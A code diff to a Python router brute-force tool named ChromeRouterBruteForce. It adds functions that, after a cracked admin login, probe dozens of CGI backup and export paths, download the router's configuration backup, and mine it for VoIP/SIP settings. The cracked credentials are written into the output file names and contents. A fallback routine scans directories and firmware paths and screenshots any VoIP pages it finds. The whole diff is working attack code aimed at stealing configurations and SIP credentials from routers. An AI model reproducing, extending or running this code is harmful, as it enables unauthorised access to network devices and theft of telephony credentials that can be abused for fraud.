@@ -1658,8 +1658,214 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error scanning advanced paths: {e}{Colors.END}")
             return []
     
+    def download_backup_file(self, base_url):
+        """Download router backup file for analysis"""
+        try:
+            print(f"{Colors.CYAN}[*] Attempting to download router backup file...{Colors.END}")
+            
+            # Common backup file paths and endpoints
+            backup_paths = [
+                "/cgi-bin/backup.cgi", "/cgi-bin/backup", "/cgi-bin/download.cgi",
+                "/cgi-bin/export.cgi", "/cgi-bin/config.cgi", "/cgi-bin/settings.cgi",
+                "/admin/backup.cgi", "/admin/download.cgi", "/admin/export.cgi",
+                "/config/backup.cgi", "/config/download.cgi", "/config/export.cgi",
+                "/settings/backup.cgi", "/settings/download.cgi", "/settings/export.cgi",
+                "/system/backup.cgi", "/system/download.cgi", "/system/export.cgi",
+                "/tools/backup.cgi", "/tools/download.cgi", "/tools/export.cgi",
+                "/maintenance/backup.cgi", "/maintenance/download.cgi", "/maintenance/export.cgi",
+                "/cgi-bin/backup", "/cgi-bin/config", "/cgi-bin/settings",
+                "/cgi-bin/export", "/cgi-bin/download", "/cgi-bin/firmware",
+                "/admin/backup", "/admin/config", "/admin/settings",
+                "/admin/export", "/admin/download", "/admin/firmware",
+                "/config/backup", "/config/download", "/config/export",
+                "/settings/backup", "/settings/download", "/settings/export",
+                "/system/backup", "/system/download", "/system/export",
+                "/tools/backup", "/tools/download", "/tools/export",
+                "/maintenance/backup", "/maintenance/download", "/maintenance/export"
+            ]
+            
+            backup_file = None
+            
+            for path in backup_paths:
+                try:
+                    backup_url = f"{base_url.rstrip('/')}{path}"
+                    print(f"{Colors.BLUE}[*] Trying backup URL: {backup_url}{Colors.END}")
+                    
+                    # Try to download backup file
+                    import requests
+                    response = requests.get(backup_url, timeout=10, stream=True)
+                    
+                    if response.status_code == 200:
+                        content_type = response.headers.get('content-type', '').lower()
+                        content_disposition = response.headers.get('content-disposition', '').lower()
+                        
+                        # Check if it's a backup file
+                        if any(keyword in content_type for keyword in ['application/octet-stream', 'application/x-binary', 'text/plain']) or \
+                           any(keyword in content_disposition for keyword in ['attachment', 'backup', 'config', 'download']):
+                            
+                            # Generate filename
+                            filename = f"backup_{int(time.time())}.cfg"
+                            backup_file = f"screenshots/{filename}"
+                            
+                            # Save backup file
+                            with open(backup_file, 'wb') as f:
+                                for chunk in response.iter_content(chunk_size=8192):
+                                    f.write(chunk)
+                            
+                            print(f"{Colors.GREEN}[+] Backup file downloaded: {backup_file}{Colors.END}")
+                            return backup_file
+                    
+                except Exception as e:
+                    print(f"{Colors.RED}[!] Error downloading from {path}: {e}{Colors.END}")
+                    continue
+            
+            print(f"{Colors.RED}[!] No backup file found{Colors.END}")
+            return None
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error downloading backup file: {e}{Colors.END}")
+            return None
+    
+    def analyze_backup_file(self, backup_file):
+        """Analyze router backup file for VoIP/SIP configurations using RouterPassView approach"""
+        try:
+            print(f"{Colors.CYAN}[*] Analyzing backup file with RouterPassView approach...{Colors.END}")
+            
+            voip_configs = []
+            
+            # Read backup file
+            with open(backup_file, 'rb') as f:
+                content = f.read()
+            
+            print(f"{Colors.BLUE}[*] Backup file size: {len(content)} bytes{Colors.END}")
+            
+            # Convert to string for analysis
+            try:
+                content_str = content.decode('utf-8', errors='ignore')
+            except:
+                content_str = str(content)
+            
+            # VoIP/SIP configuration patterns
+            voip_patterns = {
+                'voip': ['voip', 'voice over ip', 'voice over internet'],
+                'sip': ['sip', 'session initiation protocol', 'sip server', 'sip proxy'],
+                'telephony': ['telephony', 'phone', 'telephone', 'dial'],
+                'pbx': ['pbx', 'private branch exchange', 'call manager'],
+                'trunk': ['trunk', 'trunking', 'sip trunk', 'voip trunk'],
+                'gateway': ['gateway', 'voice gateway', 'sip gateway', 'voip gateway'],
+                'proxy': ['proxy', 'sip proxy', 'voip proxy'],
+                'call': ['call', 'calling', 'call routing', 'call forwarding'],
+                'dial': ['dial', 'dialing', 'dial plan', 'dial peer'],
+                'fax': ['fax', 'facsimile', 'fax server'],
+                'codec': ['codec', 'g.711', 'g.729', 'g.722', 'h.264'],
+                'dtmf': ['dtmf', 'dual tone multi frequency'],
+                'conference': ['conference', 'conferencing', 'meeting'],
+                'hold': ['hold', 'call hold', 'music on hold'],
+                'transfer': ['transfer', 'call transfer', 'blind transfer'],
+                'waiting': ['waiting', 'call waiting', 'caller id'],
+                'voicemail': ['voicemail', 'voice mail', 'vm'],
+                'extension': ['extension', 'ext', 'internal number'],
+                'line': ['line', 'phone line', 'trunk line'],
+                'port': ['port', 'sip port', 'rtp port', '5060', '5061']
+            }
+            
+            # Extract VoIP configurations
+            for category, keywords in voip_patterns.items():
+                for keyword in keywords:
+                    if keyword.lower() in content_str.lower():
+                        # Extract surrounding context
+                        context = self.extract_context(content_str, keyword, 200)
+                        if context:
+                            voip_config = {
+                                'category': category,
+                                'keyword': keyword,
+                                'context': context,
+                                'position': content_str.lower().find(keyword.lower())
+                            }
+                            voip_configs.append(voip_config)
+                            print(f"{Colors.GREEN}[+] Found {category.upper()} config: {keyword}{Colors.END}")
+            
+            # Remove duplicates
+            unique_configs = []
+            seen_contexts = set()
+            for config in voip_configs:
+                context_hash = hash(config['context'])
+                if context_hash not in seen_contexts:
+                    unique_configs.append(config)
+                    seen_contexts.add(context_hash)
+            
+            print(f"{Colors.GREEN}[+] Found {len(unique_configs)} unique VoIP/SIP configurations{Colors.END}")
+            return unique_configs
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error analyzing backup file: {e}{Colors.END}")
+            return []
+    
+    def extract_context(self, content, keyword, context_size):
+        """Extract context around a keyword"""
+        try:
+            keyword_lower = keyword.lower()
+            content_lower = content.lower()
+            
+            index = content_lower.find(keyword_lower)
+            if index == -1:
+                return None
+            
+            start = max(0, index - context_size)
+            end = min(len(content), index + len(keyword) + context_size)
+            
+            context = content[start:end]
+            return context.strip()
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error extracting context: {e}{Colors.END}")
+            return None
+    
+    def save_voip_configs_to_file(self, voip_configs, login_url, username, password):
+        """Save VoIP/SIP configurations to text file"""
+        try:
+            print(f"{Colors.CYAN}[*] Saving VoIP/SIP configurations to file...{Colors.END}")
+            
+            # Generate filename
+            from urllib.parse import urlparse
+            parsed_url = urlparse(login_url)
+            hostname = parsed_url.hostname or parsed_url.netloc
+            
+            timestamp = time.strftime("%Y%m%d_%H%M%S")
+            filename = f"voip_configs_{username}_{password}_{hostname}_{timestamp}.txt"
+            filepath = f"screenshots/{filename}"
+            
+            # Create directory if it doesn't exist
+            os.makedirs("screenshots", exist_ok=True)
+            
+            # Write configurations to file
+            with open(filepath, 'w', encoding='utf-8') as f:
+                f.write("=" * 80 + "\n")
+                f.write("VOIP/SIP CONFIGURATIONS EXTRACTED BY ROUTERPASSVIEW APPROACH\n")
+                f.write("=" * 80 + "\n")
+                f.write(f"Target: {login_url}\n")
+                f.write(f"Credentials: {username}:{password}\n")
+                f.write(f"Extracted: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total Configurations: {len(voip_configs)}\n")
+                f.write("=" * 80 + "\n\n")
+                
+                for i, config in enumerate(voip_configs, 1):
+                    f.write(f"CONFIGURATION {i}:\n")
+                    f.write(f"Category: {config['category'].upper()}\n")
+                    f.write(f"Keyword: {config['keyword']}\n")
+                    f.write(f"Position: {config['position']}\n")
+                    f.write(f"Context:\n{config['context']}\n")
+                    f.write("-" * 40 + "\n\n")
+            
+            print(f"{Colors.GREEN}[+] VoIP/SIP configurations saved to: {filepath}{Colors.END}")
+            return filepath
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error saving configurations: {e}{Colors.END}")
+            return None
+    
     def search_voip_after_success(self, login_url, username, password):
-        """Search for VoIP/SIP pages after successful login using comprehensive methods"""
+        """Search for VoIP/SIP pages after successful login using RouterPassView approach"""
         try:
             print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages after successful login...{Colors.END}")
             
@@ -1668,76 +1874,98 @@ class ChromeRouterBruteForce:
             parsed_url = urlparse(login_url)
             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
             
-            print(f"{Colors.BLUE}[*] Starting comprehensive VoIP/SIP search...{Colors.END}")
+            print(f"{Colors.BLUE}[*] Starting RouterPassView approach for VoIP/SIP extraction...{Colors.END}")
             
             screenshots_taken = []
+            voip_configs = []
             
-            # Method 1: Extract hidden links from HTML source
-            print(f"{Colors.BLUE}[*] Method 1: Extracting hidden links from HTML source...{Colors.END}")
-            hidden_links = self.extract_hidden_links_from_html()
+            # Phase 1: Try to download backup file
+            print(f"{Colors.BLUE}[*] Phase 1: Attempting to download router backup file...{Colors.END}")
+            backup_file = self.download_backup_file(base_url)
             
-            # Method 2: Execute JavaScript to find dynamic links
-            print(f"{Colors.BLUE}[*] Method 2: Executing JavaScript for dynamic links...{Colors.END}")
-            dynamic_links = self.execute_javascript_for_links()
-            
-            # Method 3: Scan common directories
-            print(f"{Colors.BLUE}[*] Method 3: Scanning common directory patterns...{Colors.END}")
-            found_directories = self.scan_common_directories(base_url)
-            
-            # Method 4: Scan CGI scripts
-            print(f"{Colors.BLUE}[*] Method 4: Scanning CGI scripts...{Colors.END}")
-            found_cgi = self.scan_cgi_scripts(base_url)
-            
-            # Method 5: Scan advanced firmware paths
-            print(f"{Colors.BLUE}[*] Method 5: Scanning advanced firmware paths...{Colors.END}")
-            found_paths = self.scan_advanced_paths(base_url)
-            
-            # Combine all found links
-            all_links = hidden_links + dynamic_links + found_directories + found_cgi + found_paths
-            
-            # Remove duplicates
-            unique_links = list(set(all_links))
-            
-            print(f"{Colors.GREEN}[+] Total unique links found: {len(unique_links)}{Colors.END}")
-            
-            # Test each unique link
-            for i, link in enumerate(unique_links):
-                try:
-                    print(f"{Colors.BLUE}[*] Testing link {i+1}/{len(unique_links)}: {link}{Colors.END}")
-                    
-                    # Navigate to link
-                    if link.startswith('http'):
-                        self.driver.get(link)
-                    elif link.startswith('/'):
-                        self.driver.get(f"{base_url.rstrip('/')}{link}")
-                    else:
+            if backup_file:
+                # Phase 2: Analyze backup file
+                print(f"{Colors.BLUE}[*] Phase 2: Analyzing backup file for VoIP/SIP configurations...{Colors.END}")
+                voip_configs = self.analyze_backup_file(backup_file)
+                
+                if voip_configs:
+                    # Phase 3: Save configurations to file
+                    print(f"{Colors.BLUE}[*] Phase 3: Saving VoIP/SIP configurations to file...{Colors.END}")
+                    config_file = self.save_voip_configs_to_file(voip_configs, login_url, username, password)
+                    if config_file:
+                        screenshots_taken.append(config_file)
+            else:
+                print(f"{Colors.YELLOW}[!] No backup file found, falling back to comprehensive search...{Colors.END}")
+                
+                # Fallback to comprehensive search methods
+                print(f"{Colors.BLUE}[*] Fallback: Starting comprehensive VoIP/SIP search...{Colors.END}")
+                
+                # Method 1: Extract hidden links from HTML source
+                print(f"{Colors.BLUE}[*] Method 1: Extracting hidden links from HTML source...{Colors.END}")
+                hidden_links = self.extract_hidden_links_from_html()
+                
+                # Method 2: Execute JavaScript to find dynamic links
+                print(f"{Colors.BLUE}[*] Method 2: Executing JavaScript for dynamic links...{Colors.END}")
+                dynamic_links = self.execute_javascript_for_links()
+                
+                # Method 3: Scan common directories
+                print(f"{Colors.BLUE}[*] Method 3: Scanning common directory patterns...{Colors.END}")
+                found_directories = self.scan_common_directories(base_url)
+                
+                # Method 4: Scan CGI scripts
+                print(f"{Colors.BLUE}[*] Method 4: Scanning CGI scripts...{Colors.END}")
+                found_cgi = self.scan_cgi_scripts(base_url)
+                
+                # Method 5: Scan advanced firmware paths
+                print(f"{Colors.BLUE}[*] Method 5: Scanning advanced firmware paths...{Colors.END}")
+                found_paths = self.scan_advanced_paths(base_url)
+                
+                # Combine all found links
+                all_links = hidden_links + dynamic_links + found_directories + found_cgi + found_paths
+                
+                # Remove duplicates
+                unique_links = list(set(all_links))
+                
+                print(f"{Colors.GREEN}[+] Total unique links found: {len(unique_links)}{Colors.END}")
+                
+                # Test each unique link
+                for i, link in enumerate(unique_links):
+                    try:
+                        print(f"{Colors.BLUE}[*] Testing link {i+1}/{len(unique_links)}: {link}{Colors.END}")
+                        
+                        # Navigate to link
+                        if link.startswith('http'):
+                            self.driver.get(link)
+                        elif link.startswith('/'):
+                            self.driver.get(f"{base_url.rstrip('/')}{link}")
+                        else:
+                            continue
+                        
+                        time.sleep(2)
+                        
+                        # Check for VoIP/SIP content
+                        if self.is_voip_sip_page():
+                            screenshot_path = self.take_screenshot(login_url, f"voip_sip_{i+1}")
+                            screenshots_taken.append(screenshot_path)
+                            print(f"{Colors.GREEN}[+] VoIP/SIP page found: {link}{Colors.END}")
+                        
+                        # Go back to admin panel
+                        self.driver.back()
+                        time.sleep(1)
+                        
+                    except Exception as e:
+                        print(f"{Colors.RED}[!] Error testing link {link}: {e}{Colors.END}")
                         continue
-                    
-                    time.sleep(2)
-                    
-                    # Check for VoIP/SIP content
-                    if self.is_voip_sip_page():
-                        screenshot_path = self.take_screenshot(login_url, f"voip_sip_{i+1}")
-                        screenshots_taken.append(screenshot_path)
-                        print(f"{Colors.GREEN}[+] VoIP/SIP page found: {link}{Colors.END}")
-                    
-                    # Go back to admin panel
-                    self.driver.back()
-                    time.sleep(1)
-                    
-                except Exception as e:
-                    print(f"{Colors.RED}[!] Error testing link {link}: {e}{Colors.END}")
-                    continue
             
             if screenshots_taken:
-                print(f"{Colors.GREEN}[+] Found {len(screenshots_taken)} VoIP/SIP pages!{Colors.END}")
+                print(f"{Colors.GREEN}[+] Found {len(screenshots_taken)} VoIP/SIP resources!{Colors.END}")
                 return screenshots_taken
             else:
-                print(f"{Colors.RED}[!] No VoIP/SIP pages found with comprehensive search{Colors.END}")
+                print(f"{Colors.RED}[!] No VoIP/SIP configurations found{Colors.END}")
                 return []
             
         except Exception as e:
-            print(f"{Colors.RED}[!] Error in comprehensive VoIP search: {e}{Colors.END}")
+            print(f"{Colors.RED}[!] Error in RouterPassView approach: {e}{Colors.END}")
             return []
     
     def is_voip_sip_page(self):
